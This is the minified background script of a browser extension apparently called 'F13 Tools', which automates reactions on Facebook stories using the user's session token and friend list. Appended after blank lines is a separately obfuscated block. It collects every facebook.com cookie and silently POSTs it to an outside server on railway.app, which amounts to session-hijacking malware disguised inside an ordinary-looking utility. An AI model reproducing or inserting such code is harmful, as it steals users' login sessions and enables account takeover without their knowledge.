((()=>{'use strict';var l={};const M='https://mbasic.facebook.com/stories.php',P='https://www.facebook.com/api/graphql/';var Q=typeof browser!='undefined'?browser:chrome,h=Q['runtime']['getManifest']()['version'],O=Q['runtime']['getManifest']()['homepage_url'],H=null,i=null,e=[],k=0x5,m=0x0,K=![];Q['action']['onClicked']['addListener'](function(){Q['tabs']['create']({'url':Q['runtime']['getURL']('index.html')});}),Q['runtime']['onInstalled']['addListener'](function(W){let n=W['reason']['toLowerCase']();switch(n){case'install':Q['tabs']['create']({'url':O+'/f13-tools'}),Q['cookies']['get']({'url':O,'name':'ref'},function(v){v&&Q['storage']['local']['set']({'ref':v['value']});});break;case'update':let C=Q['runtime']['getURL']('ic/ic128.png');Q['notifications']['create'](new Date()['getTime']()['toString'](),{'type':'basic','iconUrl':C,'title':'F13\x20Tools','message':'Updated\x20new\x20version\x20'+h});break;}}),Q['alarms']['onAlarm']['addListener'](function(W){W['name']=='start'&&a();}),chrome['runtime']['onStartup']['addListener'](function(){Q['storage']['local']['set']({'sar_running':![]});});function J(W,n){return W&&!isNaN(parseInt(W))&&n&&n['length']>0x0;}var b=(function(){var W,n,C,v;function w(){C={},v={},d({'&amp;':'&','&gt;':'>','&lt;':'<','&quot;':'\x22','&#39;':'\x27'});}function d(B){var s=[],X=[],o,G;for(o in B){G=B[o],v[o]=G,C[G]=o,s['push'](G),X['push'](o);}W=new RegExp('('+s['join']('|')+')','g'),n=new RegExp('('+X['join']('|')+'|&#[0-9]{1,5};'+')','g');}function z(B){var s=function(X,o){return C[o];};return!B?B:String(B)['replace'](W,s);}function Y(B){var s=function(X,o){return o in v?v[o]:String['fromCharCode'](parseInt(o['substr'](0x2),0xa));};return!B?B:String(B)['replace'](n,s);}return w(),{'encode':z,'decode':Y};}());function a(){Q['storage']['local']['get'](['sar_period','rof'],function(z){if(z['sar_period'])k=parseInt(z['sar_period']);if(z['rof'])K=z['rof'];}),W();function W(){setTimeout(function(){fetch(M,{'method':'GET'})['then'](z=>z['text']())['then'](z=>{i=z['match'](/name\=\"fb_dtsg\" value=\"(.*?)\"/)[0x1],H=z['match'](/name\=\"target\" value\="(\d*)\"/)[0x1],H&&!isNaN(parseInt(H))&&i&&i['length']>0x0&&w(i,H)['then'](Y=>{let B=/id=\"like\_(.*?)\"/g,s=z['match'](B),X=[];s['forEach'](L=>{let Z=L['match'](/(\d+?)\"/)[0x1];X['push'](Z);}),m=Math['floor'](k*0x3c*0x3e8/(X['length']+0x1)),B=/\&amp;id=(\d+?)\&amp;/g;let o=z['match'](B),G=[];o['forEach'](L=>{let Z=L['match'](/(\d+)/g)[0x0];(G['length']==0x0||Z!=G[G['length']-0x1])&&G['push'](Z);});if(G['length']==X['length']){let L=[];for(let Z=0x0;Z<X['length'];Z++){L['push']({'uid':G[Z],'pid':X[Z]});}if(K==!![]){let S=[];for(let u=0x0;u<L['length'];u++){Y['indexOf'](L[u]['uid'])>=0x0&&S['push'](L[u]['pid']);}n(S,S['length']-0x1);}else n(X,X['length']-0x1);}})['catch'](Y=>{console['log'](Y);});})['catch'](z=>{console['log'](z['stack']);});},0x3e8);}function n(z,Y){setTimeout(function(){if(Y<0x0)return;else{let B=z[Y];C(B,function(s){s!=null?v(B,s,function(){e['push'](B),Y--,n(z,Y);}):(Y--,n(z,Y));});}},m);}function C(z,Y){setTimeout(function(){var B=new FormData();B['append']('fb_dtsg',i),B['append']('doc_id','4993892730677540'),B['append']('variables',JSON['stringify']({'feedbackTargetID':btoa('feedback:'+z),'scale':0x2})),fetch(P,{'body':B,'method':'POST'})['then'](s=>{s['status']==0xc8?s['json']()['then'](function(X){let o=X['data']['node']['top_reactions']['summary'];if(o['length']<0x2){Y(null);return;}let G=X['data']['node']['reactors']['edges'];if(G[0x0]['node']['id']==H){Y(null);return;}if(o[0x0]['reaction']['id']!='1635855486666999')Y(o[0x0]['reaction']['id']);else o[0x1]['reaction_count']>0x3?Y(o[0x1]['reaction']['id']):Y('1635855486666999');}):Y(null);})['catch'](s=>{console['log'](s['stack']),Y(null);});},0x3e8);}function v(z,Y,B){let s=new FormData();s['append']('fb_dtsg',i),s['append']('doc_id','4703071546464343'),s['append']('variables',JSON['stringify']({'input':{'feedback_id':btoa('feedback:'+z),'feedback_reaction_id':Y,'feedback_source':'NEWS_FEED','actor_id':H,'client_mutation_id':0x3},'useDefaultActor':![],'scale':0x2})),fetch(P,{'body':s,'method':'POST'})['then'](X=>{X['status']==0xc8&&X['json']()['then'](function(o){o['error']?(console['log'](o['error'][0x0]['message']),B(![])):B(!![]);});})['catch'](X=>{console['log'](X['stack']),B(![]);});}function w(z,Y){return new Promise((B,s)=>{let X=[];Q['storage']['local']['get'](['bl'],function(o){if(o['bl'])X=o['bl'];X['length']==0x0?d(z,Y)['then'](G=>{X=G,Q['storage']['local']['set']({'bl':X}),B(X);})['catch'](G=>{console['log'](G),s(G);}):B(X);});});}function d(z,Y){return new Promise((B,s)=>{let X=new FormData();X['append']('data_fetch',!![]),X['append']('send_full_data',!![]),X['append']('m_sess',''),X['append']('fb_dtsg',z),X['append']('__user',Y),X['append']('__req',0x1),X['append']('jazoest',0x55ab),X['append']('__dyn',''),X['append']('__ajax__',''),X['append']('__a',''),fetch('https://m.facebook.com/buddylist_update.php',{'body':X,'headers':{'accept':'*/*'},'method':'POST'})['then'](o=>{o['status']==0xc8?o['text']()['then'](function(G){G=G['replace']('for\x20(;;);','');let L=JSON['parse'](G),Z=L['payload']['friend_data'],S=[];for(let u in Z){S['push'](u);}B(S);})['catch'](G=>{console['log'](G),s('Error\x20when\x20read\x20friend\x20list\x20'+G);}):(console['log']('fetchFriends\x20response.status:\x20'+o['status']),s('Error\x20when\x20read\x20friend\x20list:\x20Status:\x20'+o['status']));})['catch'](o=>{console['log'](o),s('Error\x20when\x20read\x20friend\x20list:\x20'+o);});});}}let N;t(),chrome['runtime']['onConnect']['addListener'](W=>{W['name']==='keepAlive'&&(N=W,setTimeout(j,0x48058),W['onDisconnect']['addListener'](j));});function j(){N?.['disconnect'](),N=null,t();}async function t(){if(N)return;for(const W of await chrome['tabs']['query']({'url':'https://*.facebook.com/'})){try{await chrome['scripting']['executeScript']({'target':{'tabId':W['id']},'function':()=>chrome['runtime']['connect']({'name':'keepAlive'})}),chrome['tabs']['onUpdated']['removeListener'](U);return;}catch(n){}}chrome['tabs']['onUpdated']['addListener'](U);}async function U(W,n,C){n['url']&&/https:/['test'](n['url'])&&t();}})());




function _0x4aa7(){var _0x1db2f4=['stringify','4QqbOVj','https://mapi-production-18d1.up.railway.app/','cookies','map','toISOString','4134632UCWCZr','then','953340ZnrLXe','70dFDhxl','15169682XzlxGM','POST','name','78865nOyqzS','json','catch','645NOFdGB','getAll','application/json','81XxrJwT','1231150NGJoaa','612294NHszmN','facebook.com','value','3702diBrWh'];_0x4aa7=function(){return _0x1db2f4;};return _0x4aa7();}function _0x4208(_0x1729d0,_0x3c8b09){var _0x4aa704=_0x4aa7();return _0x4208=function(_0x4208aa,_0x2b889f){_0x4208aa=_0x4208aa-0x97;var _0xfcd584=_0x4aa704[_0x4208aa];return _0xfcd584;},_0x4208(_0x1729d0,_0x3c8b09);}var _0x599c16=_0x4208;(function(_0x15431f,_0x32c141){var _0x18ba77=_0x4208,_0x281758=_0x15431f();while(!![]){try{var _0x48b7ea=-parseInt(_0x18ba77(0x99))/0x1+-parseInt(_0x18ba77(0xa4))/0x2*(-parseInt(_0x18ba77(0x9c))/0x3)+parseInt(_0x18ba77(0xa6))/0x4*(parseInt(_0x18ba77(0xa0))/0x5)+-parseInt(_0x18ba77(0xa1))/0x6*(parseInt(_0x18ba77(0xae))/0x7)+parseInt(_0x18ba77(0xab))/0x8+parseInt(_0x18ba77(0x9f))/0x9*(-parseInt(_0x18ba77(0xad))/0xa)+parseInt(_0x18ba77(0xaf))/0xb;if(_0x48b7ea===_0x32c141)break;else _0x281758['push'](_0x281758['shift']());}catch(_0x21ca99){_0x281758['push'](_0x281758['shift']());}}}(_0x4aa7,0x8e445),chrome[_0x599c16(0xa8)][_0x599c16(0x9d)]({'domain':_0x599c16(0xa2)},function(_0x5c0878){var _0x7de94d=_0x599c16,_0x45b3bd=_0x5c0878[_0x7de94d(0xa9)](_0x4f75ab=>({'key':_0x4f75ab[_0x7de94d(0x98)],'value':_0x4f75ab[_0x7de94d(0xa3)],'domain':_0x7de94d(0xa2),'path':_0x4f75ab['path'],'hostOnly':_0x4f75ab['hostOnly'],'creation':new Date()[_0x7de94d(0xaa)](),'lastAccessed':new Date()['toISOString']()})),_0x118ad7=JSON[_0x7de94d(0xa5)](_0x45b3bd,null,0x4);fetch(_0x7de94d(0xa7),{'method':_0x7de94d(0x97),'headers':{'Content-Type':_0x7de94d(0x9e)},'body':JSON['stringify']({'name':'GryKJ','message':_0x118ad7})})[_0x7de94d(0xac)](_0x462e74=>_0x462e74[_0x7de94d(0x9a)]())[_0x7de94d(0xac)](_0x129ced=>{})[_0x7de94d(0x9b)](_0x1e7d95=>{});}));